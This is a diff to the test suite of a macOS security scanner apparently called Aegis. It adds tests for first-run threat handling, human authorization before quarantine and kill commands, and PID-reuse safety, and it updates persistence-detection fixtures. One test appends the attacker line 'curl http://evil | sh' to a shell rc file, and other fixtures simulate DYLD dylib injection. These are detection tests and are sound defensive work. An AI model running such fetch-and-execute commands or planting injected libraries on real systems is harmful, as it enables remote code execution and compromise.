@@ -24,9 +24,11 @@ import sys
 import tempfile
 import time
 import unittest
+from unittest import mock
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 import aegis  # noqa: E402
+from conftest import PUBLISHER_TRUST, SUSPICIOUS_TRUST  # noqa: E402
 
 
 # Cross-platform stand-ins for the POSIX one-liners this fixture used to shell
@@ -102,7 +104,10 @@ class Sandbox(unittest.TestCase):
             "LATEST_JSON": os.path.join(self.state, "latest.json"),
             "SEEN": os.path.join(self.state, "seen.json"),
             "SIGCACHE": os.path.join(self.state, "sigcache.json"),
+            "INTENT_FILE": os.path.join(self.state, "intent.jsonl"),
+            "FLEET_SIGNERS": os.path.join(self.state, "allowed_signers"),
             "ALLOWLIST": os.path.join(self.state, "allowlist.json"),
+            "SURFACE_WALLS": os.path.join(self.state, "surface_walls.json"),
             "RUN_LOG": os.path.join(self.state, "run.log"),
             "EVENT_DB": os.path.join(self.state, "aegis.db"),
             "SELFSTATE": os.path.join(self.state, "selfstate.json"),
@@ -134,6 +139,12 @@ class Sandbox(unittest.TestCase):
             # the first time something new writes.
             "NOTARY_FILE": os.path.join(self.state, "notary.jsonl"),
             "OBSERVATIONS_DIR": os.path.join(self.state, "observations"),
+            # Vouch tier. check_vouch_store() runs inside every scan, so these
+            # are in the same "written by cmd_scan itself" class as NOTARY_FILE
+            # above: leaving them out would point the verifier at the
+            # developer's real vouch log during any scan-invoking test.
+            "VOUCH_FILE": os.path.join(self.state, "vouches.jsonl"),
+            "VOUCH_SIGNERS": os.path.join(self.state, "vouch_signers"),
             # Response-tier state. These were previously sandboxed only inside
             # TestResponseTier, so any OTHER test that reached log_action() —
             # and the protective tier's commands all do — appended to the real
@@ -421,7 +432,7 @@ class TestAgentSurfaceTruncationReportedOnOneShotScan(Sandbox):
 class TestHostileArgsSeverity(Sandbox):
     def _sev(self, args, program=None):
         rec = {"label": "x", "program": program or args[0], "args": args,
-               "trust": "apple", "sha256": "s", "run_at_load": True}
+               "trust": PUBLISHER_TRUST, "sha256": "s", "run_at_load": True}
         fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
         return fs[0]["severity"]
 
@@ -511,9 +522,37 @@ class TestFirstRunScoping(Sandbox):
         aegis.check_hardening, aegis.check_processes = self._saved_checks
         super().tearDown()
 
-    def test_hotdir_threat_present_at_first_scan_notifies(self):
+    def _hotdir_findings(self):
+        return [f for f in aegis.load_json(aegis.LATEST_JSON, {}).get(
+            "findings", []) if f.get("category") == "hot-dir"]
+
+    def test_hotdir_threat_present_at_first_scan_is_cased_not_adopted(self):
+        """First-run adoption is for RESIDUE (persistence, shell history); a
+        payload in a hot dir is a LIVE risk and must never be folded into the
+        baseline. The very first scan also opens the learning period, whose
+        contract is 'recorded and cased, pre-closed as learning, not popped'
+        — so on scan 1 the proof is the record, not the notification. (The
+        routing gate made this real: before it, learning pre-closed the
+        incident while the desktop notification still fired.)"""
         self.adhoc_binary(os.path.join(self.hot, "payload"))
         aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
+        self.assertTrue(self._hotdir_findings(),
+                        "a hot-dir threat present before install must be found")
+        cases = [i for i in aegis.list_incidents(active_only=False)
+                 if i["correlation_key"].startswith("signal:hotdir:")]
+        self.assertTrue(cases, "a first-scan hot-dir threat must open a case")
+        self.assertEqual(cases[0]["resolution"], "learning-period")
+        self.assertEqual(self.notifications, [])
+
+    def test_hotdir_threat_present_at_first_scan_notifies_unless_learning(self):
+        """With no learning window a live threat on scan 1 interrupts."""
+        saved = aegis._LEARNING_DEFAULT_DAYS
+        aegis._LEARNING_DEFAULT_DAYS = 0
+        try:
+            self.adhoc_binary(os.path.join(self.hot, "payload"))
+            aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
+        finally:
+            aegis._LEARNING_DEFAULT_DAYS = saved
         self.assertTrue(self.notifications,
                         "a hot-dir threat present before install must alert")
 
@@ -755,6 +794,10 @@ class TestShellRc(Sandbox):
         aegis.check_processes = lambda: []
         aegis.cmd_scan(quiet=True)                      # first run: adopt
         self.assertEqual(self.notifications, [])
+        # The first run also opened the learning window, under which a HIGH
+        # is cased pre-closed rather than popped; end it (`aegis.py learn 0`)
+        # so this asserts adoption scoping, not the learning contract.
+        aegis._set_learning_period(0)
         with open(p, "a") as fh:
             fh.write("curl http://evil | sh\n")         # attacker appends
         aegis.cmd_scan(quiet=True)
@@ -768,7 +811,7 @@ class TestShellRc(Sandbox):
 class TestDyldInjection(Sandbox):
     def test_dyld_insert_libraries_is_high(self):
         rec = {"label": "x", "program": "/usr/bin/python3", "args": None,
-               "trust": "apple", "sha256": "s", "run_at_load": True,
+               "trust": PUBLISHER_TRUST, "sha256": "s", "run_at_load": True,
                "env": {"DYLD_INSERT_LIBRARIES": "/Users/me/.hidden/evil.dylib"}}
         fs = aegis.check_persistence({}, {"/fake/x.plist": rec})
         self.assertGreaterEqual(aegis.SEV_ORDER[fs[0]["severity"]],
@@ -792,7 +835,7 @@ class TestDyldInjection(Sandbox):
 # --------------------------------------------------------------------------- #
 class TestExpandedHostileArgs(Sandbox):
     def _sev(self, args):
-        rec = {"label": "x", "program": args[0], "args": args, "trust": "apple",
+        rec = {"label": "x", "program": args[0], "args": args, "trust": PUBLISHER_TRUST,
                "sha256": "s", "run_at_load": True, "env": None}
         return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
 
@@ -819,10 +862,10 @@ class TestQuarantineProvenance(Sandbox):
         p = os.path.join(self.tmp, "f")
         with open(p, "w") as f:
             f.write("x")
-        self.assertEqual(aegis.quarantine_origin(p), (False, None))
+        self.assertEqual(aegis._quarantine_fields(p), (False, None, None))
         subprocess.run(["xattr", "-w", "com.apple.quarantine",
                         "0081;00000000;Safari;ABC", p], check=False)
-        present, agent = aegis.quarantine_origin(p)
+        present, agent, _uuid = aegis._quarantine_fields(p)
         self.assertTrue(present)
         self.assertEqual(agent, "Safari")
 
@@ -1015,7 +1058,7 @@ class TestSurfaceAdoptionOnUpgrade(Sandbox):
 class TestHiddenHomeScriptPersistence(Sandbox):
     def _sev(self, args, program="/bin/bash"):
         rec = {"label": "com.finder.helper", "program": program, "args": args,
-               "trust": "apple", "sha256": "s", "run_at_load": True, "env": None}
+               "trust": PUBLISHER_TRUST, "sha256": "s", "run_at_load": True, "env": None}
         return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
 
     def test_bash_hidden_home_script_is_high(self):
@@ -1115,7 +1158,7 @@ class TestIdeExtensions(Sandbox):
 class TestInterpreterScriptTarget(Sandbox):
     def _sev(self, args):
         rec = {"label": "com.user.x", "program": args[0], "args": args,
-               "trust": "apple", "sha256": "s", "run_at_load": True, "env": None}
+               "trust": PUBLISHER_TRUST, "sha256": "s", "run_at_load": True, "env": None}
         return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
 
     def test_phexia_osascript_userlib_script_is_medium(self):
@@ -1540,7 +1583,7 @@ class TestWalletIntegrity(Sandbox):
 class TestVendorImpersonation(Sandbox):
     def _sev(self, label, authority, prog="/Users/x/.hidden/GoogleUpdate"):
         rec = {"label": label, "program": prog, "args": [prog],
-               "trust": "developer-id", "sha256": "s", "run_at_load": True,
+               "trust": PUBLISHER_TRUST, "sha256": "s", "run_at_load": True,
                "env": None, "authority": authority}
         return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
 
@@ -1616,6 +1659,126 @@ class TestTrustStoreTamper(Sandbox):
         aegis.record_selfstate()
         fs = aegis.check_self_protection()
         self.assertFalse(any("tampered" in f["fingerprint"] for f in fs), fs)
+
+
+class TestResponseCliRequiresHumanAuthorization(unittest.TestCase):
+    """Mutating response commands must prove a human at the dispatcher.
+
+    The internal cmd_* functions stay composable/testable; only direct CLI
+    entry is gated, before any response implementation can mutate state.
+    """
+
+    COMMANDS = (
+        ("quarantine", "/tmp/payload", "cmd_quarantine"),
+        ("restore", "qid-1", "cmd_restore"),
+        ("destroy", "qid-1", "cmd_destroy"),
+        ("kill", "4242", "cmd_kill"),
+        ("freeze", "4242", "cmd_freeze"),
+        ("thaw", "freeze-1", "cmd_thaw"),
+        ("neutralize", "/tmp/payload", "cmd_neutralize"),
+    )
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp(prefix="aegis_response_auth_")
+        self._paths = (aegis.STATE_DIR, aegis.ACTION_LOG, aegis.RUN_LOG)
+        aegis.STATE_DIR = self.tmp
+        aegis.ACTION_LOG = os.path.join(self.tmp, "actions.jsonl")
+        aegis.RUN_LOG = os.path.join(self.tmp, "run.log")
+
+    def tearDown(self):
+        aegis.STATE_DIR, aegis.ACTION_LOG, aegis.RUN_LOG = self._paths
+        shutil.rmtree(self.tmp, ignore_errors=True)
+
+    def _audit(self):
+        with open(aegis.ACTION_LOG, "r", encoding="utf-8") as fh:
+            return [json.loads(line) for line in fh if line.strip()]
+
+    def test_refusal_happens_before_any_mutating_command_runs(self):
+        saved_auth = aegis.authorize_interactive
+        saved_cmds = {name: getattr(aegis, name) for _, _, name in self.COMMANDS}
+        authorizations, mutations = [], []
+
+        def refuse(purpose, target):
+            authorizations.append((purpose, target))
+            return False, "refused-not-interactive"
+
+        aegis.authorize_interactive = refuse
+        for _verb, _arg, name in self.COMMANDS:
+            setattr(aegis, name,
+                    lambda *a, _name=name, **k: mutations.append(_name) or 0)
+        try:
+            for verb, arg, _name in self.COMMANDS:
+                extra = ["--yes"] if verb == "destroy" else []
+                self.assertNotEqual(0, aegis.main(["aegis.py", verb, arg] + extra))
+        finally:
+            aegis.authorize_interactive = saved_auth
+            for name, fn in saved_cmds.items():
+                setattr(aegis, name, fn)
+        self.assertEqual([], mutations)
+        self.assertEqual(
+            ["%s %s" % (verb, arg) for verb, arg, _ in self.COMMANDS],
+            [target for _purpose, target in authorizations])
+
+    def test_authorized_destroy_still_requires_and_preserves_yes(self):
+        saved_auth, saved_destroy = (aegis.authorize_interactive,
+                                     aegis.cmd_destroy)
+        seen = []
+        aegis.authorize_interactive = lambda purpose, target: (True, "tty-only")
+        aegis.cmd_destroy = lambda qid, confirmed=False: seen.append(
+            (qid, confirmed)) or 0
+        try:
+            self.assertEqual(0, aegis.main(
+                ["aegis.py", "destroy", "qid-1", "--yes"]))
+        finally:
+            aegis.authorize_interactive, aegis.cmd_destroy = (saved_auth,
+                                                               saved_destroy)
+        self.assertEqual([("qid-1", True)], seen)
+
+    def test_every_authorization_decision_is_durably_bound_to_command(self):
+        saved_auth = aegis.authorize_interactive
+        saved_cmds = {name: getattr(aegis, name) for _, _, name in self.COMMANDS}
+        channels = iter(["gui-dialog", "notification", "tty-only",
+                         "gui-dialog", "notification", "tty-only",
+                         "gui-dialog"])
+        aegis.authorize_interactive = lambda purpose, target: (True,
+                                                                next(channels))
+        for _verb, _arg, name in self.COMMANDS:
+            setattr(aegis, name, lambda *a, **k: 0)
+        try:
+            for verb, arg, _name in self.COMMANDS:
+                extra = ["--yes"] if verb == "destroy" else []
+                self.assertEqual(0, aegis.main(["aegis.py", verb, arg] + extra))
+        finally:
+            aegis.authorize_interactive = saved_auth
+            for name, fn in saved_cmds.items():
+                setattr(aegis, name, fn)
+        records = self._audit()
+        self.assertEqual(7, len(records))
+        self.assertEqual(["response-auth"] * 7,
+                         [r["action"] for r in records])
+        self.assertEqual(
+            ["%s %s" % (verb, arg) for verb, arg, _ in self.COMMANDS],
+            [r["target"] for r in records])
+        self.assertEqual(
+            ["gui-dialog", "notification", "tty-only", "gui-dialog",
+             "notification", "tty-only", "gui-dialog"],
+            [r["channel"] for r in records])
+
+        # A refusal is equally important evidence and must land before return.
+        aegis.authorize_interactive = lambda purpose, target: (
+            False, "refused-not-interactive")
+        saved_kill = aegis.cmd_kill
+        aegis.cmd_kill = lambda *a, **k: self.fail("refusal reached mutation")
+        try:
+            self.assertEqual(1, aegis.main(["aegis.py", "kill", "99"]))
+        finally:
+            aegis.authorize_interactive, aegis.cmd_kill = (saved_auth,
+                                                            saved_kill)
+        refused = self._audit()[-1]
+        self.assertEqual("response-auth", refused["action"])
+        self.assertEqual("kill 99", refused["target"])
+        self.assertEqual("refused", refused["result"])
+        self.assertEqual("refused-not-interactive", refused["channel"])
 
 
 class TestResponseTier(Sandbox):
@@ -1931,6 +2094,31 @@ class TestResponseTier(Sandbox):
         self.assertEqual(subprocess.run(["ps", "-p", str(target)]).returncode, 0,
                          "guard should not have killed the other-user process")
 
+    def test_kill_refuses_pid_reused_after_authorization(self):
+        """A PID is only a slot: if its process start token changes between
+        authorization and signalling, Aegis must fail closed without sending
+        any signal to the replacement process."""
+        tokens = iter(("start-A", "start-B"))
+        sent = []
+        with mock.patch.object(aegis, "_process_identity",
+                               return_value=(str(os.getuid()), "harmless")), \
+             mock.patch.object(aegis, "_process_start_token", create=True,
+                               side_effect=lambda _pid: next(tokens)), \
+             mock.patch.object(aegis.os, "kill",
+                               side_effect=lambda pid, sig: sent.append((pid, sig))):
+            self.assertNotEqual(aegis.cmd_kill(424242), 0)
+        self.assertEqual(sent, [], "replacement process received a signal")
+
+    def test_ci_actions_use_supported_node_runtime(self):
+        workflow = os.path.join(os.path.dirname(os.path.dirname(__file__)),
+                                ".github", "workflows", "ci.yml")
+        with open(workflow, encoding="utf-8") as fh:
+            text = fh.read()
+        self.assertNotIn("actions/checkout@v4", text)
+        self.assertNotIn("actions/setup-python@v5", text)
+        self.assertIn("actions/checkout@v5", text)
+        self.assertIn("actions/setup-python@v6", text)
+
     # neutralize (ordered launchd kill-chain) -----------------------------
     def test_neutralize_quarantines_plist(self):
         plist = self.write_plist("com.evil.agent.plist",
@@ -2058,6 +2246,11 @@ class TestListenerSurface(Sandbox):
 # invisible to the file-oriented Mach-O check. Ad-hoc bundle ⇒ HIGH; signed-but-
 # unnotarized ⇒ MEDIUM with Gatekeeper's own verdict; notarized ⇒ silent.
 # --------------------------------------------------------------------------- #
+# Keeps the LITERAL "developer-id" on purpose: an unnotarized Developer-ID
+# .app is a macOS Gatekeeper concept with no analog on any other body, and
+# this class is macOS-gated in conftest for exactly that reason. Proven by
+# mutation 2026-08-24 — swapping it to PUBLISHER_TRUST was the only one of
+# four sites that broke a test.
 class TestHotDirAppBundle(Sandbox):
     def _mk_app(self, name="Evil.app"):
         app = os.path.join(self.hot, name)
@@ -2719,6 +2912,28 @@ class TestIntelFeeds(Sandbox):
             aegis.check_intel({"k": "notadict", "j": {"sha256": None}},
                               [{}, "x"]), [])
 
+    def test_check_intel_loads_sets_once_for_the_whole_pass(self):
+        sha = "55" * 32
+        self._write_intel(tf_hashes={sha: {"family": "AMOS",
+                                           "first_seen": None}})
+        real_sets = aegis._intel_sets
+        calls = []
+
+        def counting_sets():
+            calls.append(1)
+            return real_sets()
+
+        aegis._intel_sets = counting_sets
+        try:
+            fs = aegis.check_intel({
+                "a": {"sha256": sha, "program": "/a"},
+                "b": {"sha256": sha, "program": "/b"},
+            })
+        finally:
+            aegis._intel_sets = real_sets
+        self.assertEqual(2, len(fs))
+        self.assertEqual(1, len(calls), "intel sets were loaded per hash")
+
     def test_outbound_connection_to_known_c2_is_critical(self):
         self._write_intel(tf_net={self.C2: {"family": "Cobalt Strike",
                                             "first_seen": "2026-08-01"}})
@@ -3109,7 +3324,7 @@ class TestPersistenceEnvDiff(Sandbox):
         return {"label": "com.benign.updater",
                 "program": "/opt/homebrew/bin/updater",
                 "args": ["/opt/homebrew/bin/updater"], "sha256": "a" * 64,
-                "trust": "developer-id", "run_at_load": True,
+                "trust": PUBLISHER_TRUST, "run_at_load": True,
                 "authority": "Developer ID Application: Benign Corp (TEAM123456)",
                 "env": None}
 
@@ -3264,7 +3479,7 @@ class TestProgramArgv0Decoy(Sandbox):
         self.write_plist("honest.plist",
                          ["/bin/bash", "-c", self.PAYLOAD], program="/bin/bash")
         saved_cls = aegis.classify_signature
-        aegis.classify_signature = lambda p: {"trust": "apple", "team": None,
+        aegis.classify_signature = lambda p: {"trust": PUBLISHER_TRUST, "team": None,
                                               "authority": "Software Signing"}
         try:
             snap = aegis.snapshot_persistence()
@@ -3296,7 +3511,7 @@ class TestProgramArgv0Decoy(Sandbox):
 class TestHiddenHomeNormpathDodge(Sandbox):
     def _rec(self, args):
         return {"label": "com.user.helper", "program": "/bin/bash",
-                "trust": "apple", "authority": "Software Signing", "args": args,
+                "trust": PUBLISHER_TRUST, "authority": "Software Signing", "args": args,
                 "env": None, "run_at_load": True, "sha256": "deadbeef"}
 
     def test_clean_hidden_home_script_is_high_control(self):
@@ -3392,7 +3607,7 @@ class TestBaselineSchemaMigration(Sandbox):
         return {"created": "legacy", "persistence": {"/tmp/agent.plist": {
             "label": "agent", "program": "/bin/sh",
             "args": ["/bin/sh", "-c", "token=%s" % secret],
-            "trust": "apple", "sha256": "abc", "run_at_load": True,
+            "trust": PUBLISHER_TRUST, "sha256": "abc", "run_at_load": True,
         }}}
 
     def test_owned_legacy_baseline_is_hashed_redacted_and_rewatermarked(self):
@@ -3413,6 +3628,33 @@ class TestBaselineSchemaMigration(Sandbox):
         self.assertEqual(state["baseline_sha"], aegis.sha256(aegis.BASELINE))
         self.assertFalse(any("tampered" in f["fingerprint"]
                              for f in aegis.check_self_protection()))
+
+    def test_v2_baseline_with_positional_exec_keys_is_rekeyed_once(self):
+        """The exec-identity fix normalized BOTH diff sides on every scan
+        because the persisted baseline was never rewritten. Schema v3 settles
+        the keys in the store once, watermark-guarded like v2."""
+        new_key = aegis._exec_identity("node", ["srv"])
+        ent = {"cmd": "node", "args": ["srv"], "target": "/usr/bin/node",
+               "target_sha": "a" * 64}
+        aegis.save_json(aegis.BASELINE, {
+            "created": "t", "schema_version": 2, "trust": "verified",
+            "persistence": {},
+            "agent_surface": {"/cfg.json": {
+                "sha256": "x" * 64,
+                "execs": {"hooks.SessionStart[0].hooks[0]|node srv": ent}}}})
+        aegis.save_json(aegis.SELFSTATE,
+                        {"baseline_sha": aegis.sha256(aegis.BASELINE)})
+        baseline, corrupt = aegis.load_baseline()
+        self.assertFalse(corrupt)
+        self.assertEqual(baseline["schema_version"],
+                         aegis.BASELINE_SCHEMA_VERSION)
+        self.assertEqual(baseline["trust"], "verified")
+        self.assertEqual(
+            list(baseline["agent_surface"]["/cfg.json"]["execs"]), [new_key])
+        with open(aegis.BASELINE, "r", encoding="utf-8") as stored:
+            self.assertIn(new_key, stored.read())   # settled ON DISK
+        state = aegis.load_json(aegis.SELFSTATE, {})
+        self.assertEqual(state["baseline_sha"], aegis.sha256(aegis.BASELINE))
 
     def test_watermark_mismatch_blocks_migration_and_remains_detectable(self):
         secret = "sk-live-DoNotLaunderTamper"
@@ -3976,7 +4218,7 @@ class TestPersistenceChangeDetail(Sandbox):
 
     def _base(self, **kw):
         rec = {"label": "com.charlie.aegis", "program": "/usr/bin/python3",
-               "sha256": "0f534e4b", "trust": "apple", "run_at_load": True,
+               "sha256": "0f534e4b", "trust": PUBLISHER_TRUST, "run_at_load": True,
                "args": ["/usr/bin/python3", "/x/aegis.py", "watch", "600"],
                "args_sha256": "AAA", "env": None}
         rec.update(kw)
@@ -3995,7 +4237,7 @@ class TestPersistenceChangeDetail(Sandbox):
     def test_program_path_change_shows_old_and_new_path(self):
         detail = self._changed(
             self._base(),
-            self._base(program="/tmp/evil", sha256="dead", trust="adhoc"))
+            self._base(program="/tmp/evil", sha256="dead", trust=SUSPICIOUS_TRUST))
         self.assertIn("program /usr/bin/python3 -> /tmp/evil", detail)
 
     def test_program_bytes_change_shows_hash_delta_when_path_same(self):
